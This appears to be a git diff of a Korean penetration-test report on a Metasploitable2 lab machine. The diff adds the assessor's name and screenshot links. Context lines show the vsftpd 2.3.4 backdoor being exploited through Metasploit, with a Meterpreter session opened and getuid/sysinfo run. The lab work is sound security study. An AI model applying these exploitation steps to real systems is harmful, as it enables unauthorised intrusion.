@@ -15,7 +15,7 @@ Metasploitable2 가상머신을 대상으로 수행한 취약점 점검 결과�
 |---|---|
 | 점검 대상 | Metasploitable2 (192.168.118.129) |
 | 점검 기간 | 2026-10-02 |
-| 점검자 | (본인 이름) |
+| 점검자 | 이기원 |
 | 발견 취약점 수 | 1건 (Critical 1) |
 
 ---
@@ -78,7 +78,8 @@ vsftpd 2.3.4 버전은 2011년 공식 배포 서버가 침해되어, 소스코�
    64 bytes from 192.168.118.129: icmp_seq=1 ttl=64 time=1.02 ms
    3 packets transmitted, 3 received, 0% packet loss
    ```
-   > [스크린샷 삽입: ping 결과]
+   > <img width="544" height="192" alt="image" src="https://github.com/user-attachments/assets/9b4d0c48-b00a-4094-a0de-5bca6ea60048" />
+
 
 2. **취약점 식별**: Metasploit 모듈 검색 및 선택
    ```
@@ -101,14 +102,16 @@ vsftpd 2.3.4 버전은 2011년 공식 배포 서버가 침해되어, 소스코�
    [+] 192.168.118.129:21 - Backdoor has been spawned!
    [*] Meterpreter session 1 opened (192.168.118.128:4444 -> 192.168.118.129:36529)
    ```
-   > [스크린샷 삽입: exploit 성공 로그]
+   > <img width="1000" height="140" alt="image" src="https://github.com/user-attachments/assets/1b31437b-b99e-4f12-b424-777641db2163" />
+
 
 5. **권한 확인**
    ```
    meterpreter > getuid
    meterpreter > sysinfo
    ```
-   > [스크린샷 삽입: getuid / sysinfo 결과]
+   > <img width="753" height="129" alt="image" src="https://github.com/user-attachments/assets/62ecd4be-f327-4903-ae60-2254b5b97050" />
+
 
 #### 영향 (Impact)
 공격자가 FTP 포트에 대한 단순 접근만으로, 인증 절차 없이 대상 시스템의
